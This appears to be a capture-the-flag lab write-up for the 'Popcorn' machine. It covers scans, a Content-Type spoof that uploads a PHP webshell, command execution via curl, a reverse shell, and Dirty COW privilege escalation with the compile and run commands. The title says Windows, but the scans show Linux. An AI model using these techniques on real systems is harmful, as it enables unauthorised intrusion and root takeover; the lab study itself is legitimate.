# Popcorn - Windows, easy (10.10.10.6)

### Enumeration

Nmap scan:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Gobuster scan:
```
/index                (Status: 200) [Size: 177]
/test                 (Status: 200) [Size: 47032]
/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/]     
```

Nikto scan:
```
...
+ Apache/2.2.12 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Retrieved x-powered-by header: PHP/5.2.10-2ubuntu6.10
+ /test: Output from the phpinfo() function was found.
+ OSVDB-112004: /test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
...
```

I was trying a shellshock attack, since at page /test we can see a script in cgi-bin called test.php, but it does not work.

### Obtaining user www-data
Checking page /torrent we can see that there is a login form but we have also the possibility to register ourselves with a new account.
At http://10.10.10.6/torrent/torrents.php?mode=upload we can upload an .iso file, so I downlaoded a kali linux image and tried to upload it.
After a while, the website redirect us to the page that shows details about our upload.
Here we can edit the torrent and upload some screenshots.
I tried to upload a .php webshell but the websites tell us that this is an invalid file.
Sending the request to the repeater, we can play a bit with it.
```
-----------------------------39809701351887264379441595880
Content-Disposition: form-data; name="file"; filename="webshell.php"
Content-Type: application/x-php
```

Changing the extension from .php to .png does not change the situation, but changin the **Content-Type** to **image/png** allows us to upload it even if this is a php file, and this is the answer we receive:
```
Upload: webshell.php
Type: image/png
Size: 0.0390625 Kb
Upload Completed.
Please refresh to see the new screenshot.
```

Now we need to find the location of these files.
We a gobuster scan we identify page **/torrent/upload/**, and we can see our php file.
```
kali@kali:~$ curl http://10.10.10.6/torrent/upload/193ea16e3be7462bd6f3b1f6a6e0cc0a860dd828.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It works!

So now it's time to get a shell.

Just upload a php reverse shell file and then, using nc, wait to the connection.
Now we can get the first flag!

### From www-data to Root
With `uname -r` we can notice that the kernel version is 2.6.31 which is < v 3.9, so we can perform a **Dirty Cow Attack** (CVE-2016-5195).
Using searchsploit we can search for dirty cow. We can utilize the following script: `searchsploit -m exploits/linux/local/40839.c`.
Get a copy of this file on the target using a python server and wget and then compile it `gcc -pthread 40839.c -o dirty -lcrypt` and change permissions `chmod +x dirty`.
Execute the binary, set a new password and then with `su firefart` you'll get a new shell:
```
firefart@popcorn:/dev/shm# id
uid=0(firefart) gid=0(root) groups=0(root)
```

Now we can get the root flag!

